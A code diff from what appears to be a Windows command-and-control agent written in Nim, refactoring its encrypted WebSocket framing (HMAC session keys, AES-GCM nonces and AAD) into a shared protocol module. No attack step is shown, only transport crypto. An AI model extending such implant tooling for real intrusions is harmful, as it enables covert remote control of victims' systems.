@@ -82,6 +82,7 @@ import std/[strutils, json, os, times, random, base64,
             sequtils, tables, hashes, uri, osproc, math, options,
             locks, macros, monotimes, atomics, unicode]
 import nimcrypto/sysrand
+import common/proto
 import winim/lean
 import winim/inc/[windef, winbase, winuser, wingdi, tlhelp32, shellapi, winhttp, wininet, winreg]
 
@@ -762,10 +763,8 @@ proc logMsg(msg: string) =
 # =============================================================================
 # CRYPTO (v2: session key + AAD + counter nonce) - WS path only
 # =============================================================================
-# We share the same on-wire format as agent.nim so the existing
-# c2_server.nim handles sentinel_ws without modification. Tests in
-# tests/test_crypto.nim and tests/e2e_harness.py validate this exact
-# scheme.
+# Shared implementation imported from common/proto.nim (same module the
+# server uses). Only the session-object wrappers live here.
 when defined(c2_ws) or defined(c2_both):
   type
     SessionCrypto = ref object
@@ -775,63 +774,21 @@ when defined(c2_ws) or defined(c2_both):
       agentId: string
       peerNonce: array[16, byte]
 
-  proc deriveSessionKey(secret: string,
-                        ourNonce, peerNonce: openArray[byte]): array[32, byte] =
-    # HMAC-SHA256(secret, peer || our) -> 32-byte session key
-    var ctx: HMAC[sha256]
-    ctx.init(secret)
-    ctx.update(ourNonce)
-    ctx.update(peerNonce)
-    let d = ctx.finish()
-    for i in 0..<32: result[i] = d.data[i]
-    ctx.clear()
-
-  proc makeNonce(ctr: uint32, randBytes: openArray[byte]): array[12, byte] =
-    result[0] = byte((ctr shr 24) and 0xFF)
-    result[1] = byte((ctr shr 16) and 0xFF)
-    result[2] = byte((ctr shr 8) and 0xFF)
-    result[3] = byte(ctr and 0xFF)
-    for i in 0..<8: result[4 + i] = randBytes[i]
-
-  proc makeAad(agentId: string, dir: byte): seq[byte] =
-    result = newSeqOfCap[byte](agentId.len + 1)
-    for c in agentId: result.add(byte(c))
-    result.add(dir)
-
   proc encryptFrame(sc: SessionCrypto, plain: string): seq[byte] =
     var randBytes: array[8, byte]
     discard randomBytes(addr randBytes[0], 8)
     let nonce = makeNonce(sc.sendCtr, randBytes)
     inc sc.sendCtr
     let aad = makeAad(sc.agentId, AAD_DIR_A2S)
-    var ctx: GCM[aes256]
-    ctx.init(sc.key, nonce, aad)
-    let pt = cast[seq[byte]](plain)
-    var ct = newSeq[byte](pt.len)
-    ctx.encrypt(pt, ct)
-    let tag = ctx.getTag()
-    result = newSeqOfCap[byte](12 + ct.len + 16)
+    result = newSeqOfCap[byte](12 + plain.len + 16)
     for b in nonce: result.add(b)
-    for b in ct: result.add(b)
-    for b in tag: result.add(b)
+    for b in gcmSeal(sc.key, nonce, aad, plain): result.add(b)
 
   proc decryptFrame(sc: SessionCrypto, blob: openArray[byte]): string =
     if blob.len < 28: return ""
     var nonce: array[12, byte]
     for i in 0..<12: nonce[i] = blob[i]
-    let ctLen = blob.len - 12 - 16
-    if ctLen < 0: return ""
-    let ct = blob[12 ..< 12 + ctLen]
-    let tag = blob[blob.len - 16 ..< blob.len]
-    let aad = makeAad(sc.agentId, AAD_DIR_S2A)
-    var ctx: GCM[aes256]
-    ctx.init(sc.key, nonce, aad)
-    var pt = newSeq[byte](ct.len)
-    if not ctx.decrypt(ct, pt, tag): return ""
-    result = cast[string](pt)
-
-  proc hmacHex(secret, data: string): string =
-    toHex(sha256.hmac(secret, data).data)
+    gcmOpen(sc.key, nonce, makeAad(sc.agentId, AAD_DIR_S2A), blob[12 ..< blob.len])
 
 # =============================================================================
 # UTILITIES
